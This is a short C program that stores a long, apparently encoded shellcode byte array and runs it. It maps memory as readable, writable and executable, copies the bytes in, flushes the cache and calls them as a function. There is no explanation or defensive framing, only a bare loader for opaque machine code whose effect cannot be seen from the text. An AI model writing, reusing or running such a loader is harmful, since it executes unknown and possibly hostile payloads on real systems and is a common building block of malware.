#include<sys/mman.h>
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<unistd.h>


unsigned char shellcode[]="\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x21\x30\x5f\x52\x23\x30\x53\x55\x3f\x40\x53\x52\x3f\x60\x53\x52\x40\x50\x43\x52\x3a\x30\x4d\x52\x65\x44\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x54\x63\x57\x65\x54\x63\x57\x65\x54\x63\x57\x65\x54\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x54\x63\x57\x65\x54\x63\x57\x65\x54\x63\x57\x65\x54\x63\x57\x21\x30\x4d\x52\x47\x41\x33\x59\x30\x50\x34\x52\x7a\x60\x44\x52\x66\x60\x46\x52\x2d\x60\x46\x52\x76\x74\x4f\x50\x21\x30\x57\x55\x75\x34\x33\x50\x21\x30\x47\x55\x38\x74\x57\x50\x21\x30\x57\x55\x75\x34\x33\x50\x21\x30\x47\x55\x38\x74\x57\x50\x21\x30\x57\x55\x78\x34\x33\x50\x21\x30\x47\x45\x40\x60\x34\x42\x4e\x60\x46\x52\x36\x74\x47\x50\x21\x30\x57\x55\x75\x34\x33\x50\x21\x30\x47\x55\x38\x74\x57\x50\x21\x30\x57\x55\x75\x34\x33\x50\x21\x30\x47\x55\x38\x74\x57\x50\x21\x30\x57\x55\x75\x34\x33\x50\x21\x30\x47\x55\x5a\x60\x44\x52\x36\x74\x47\x50\x21\x30\x57\x55\x75\x34\x33\x50\x78\x34\x33\x50\x21\x30\x47\x45\x38\x74\x57\x40\x21\x30\x57\x55\x75\x34\x33\x50\x78\x34\x33\x50\x21\x30\x47\x45\x38\x74\x57\x40\x21\x30\x57\x55\x75\x34\x33\x50\x78\x34\x33\x50\x21\x30\x47\x45\x38\x74\x57\x40\x38\x74\x57\x50\x21\x30\x57\x55\x75\x34\x33\x50\x21\x30\x47\x55\x38\x74\x57\x50\x21\x30\x57\x55\x75\x34\x33\x50\x21\x30\x47\x55\x38\x74\x57\x50\x21\x30\x57\x55\x78\x34\x33\x50\x21\x30\x47\x45\x38\x74\x57\x40\x38\x74\x57\x50\x74\x64\x37\x50\x38\x64\x56\x50\x38\x64\x56\x50\x74\x34\x58\x50\x32\x30\x60\x4f\x21\x30\x34\x42\x21\x30\x57\x55\x3f\x30\x53\x52\x26\x30\x30\x4a\x63\x37\x34\x50\x38\x74\x57\x50\x21\x50\x57\x55\x3f\x50\x55\x52\x65\x3a\x33\x50\x38\x74\x57\x50\x21\x50\x57\x55\x3f\x50\x55\x52\x65\x3d\x33\x50\x38\x74\x57\x50\x21\x50\x57\x55\x3f\x50\x55\x52\x35\x34\x33\x50\x38\x74\x57\x50\x21\x30\x46\x55\x63\x34\x24\x50\x22\x30\x46\x55\x63\x34\x24\x50\x23\x30\x46\x55\x38\x64\x56\x50\x38\x64\x56\x50\x38\x64\x56\x50\x2a\x30\x30\x5a\x32\x30\x60\x4f\x45\x40\x41\x4e\x77\x60\x5f\x5f\x67\x4d\x4b\x40\x3f\x49\x42\x62\x40\x46\x41\x5f\x77\x6f\x3f\x3f\x3f\x4d\x7b\x40\x5b\x49\x42\x62\x3f\x3f\x41\x5f\x77\x6f\x3f\x3f\x3f\x4d\x7c\x47\x58\x55\x70\x6b\x5a\x71\x6f\x5f\x4f\x54\x48\x4c\x5c\x62\x5b\x5f\x53\x75\x60\x64\x5a\x45\x70\x62\x5a\x75\x50\x64\x47\x4f\x69\x4f\x26";
size_t shellcode_len=sizeof(shellcode)-1; // -1 to exclude the null terminator

int main() {
    // 1. Determine the page size
    long page_size=sysconf(_SC_PAGESIZE);
    if (page_size==-1) {
        perror("sysconf");
        exit(EXIT_FAILURE);
    }

    // 2. Allocate new memory with PROT_READ | PROT_WRITE | PROT_EXEC
    void *exec_mem=mmap(NULL, shellcode_len,
                          PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (exec_mem==MAP_FAILED) {
        perror("mmap failed");
        exit(EXIT_FAILURE);
    }

    // 3. Copy the shellcode into the newly allocated memory
    memcpy(exec_mem, shellcode, shellcode_len);
    __builtin___clear_cache(exec_mem, exec_mem + shellcode_len);
    void (*func)()=(void (*)())exec_mem;
    func();

    return 0;
}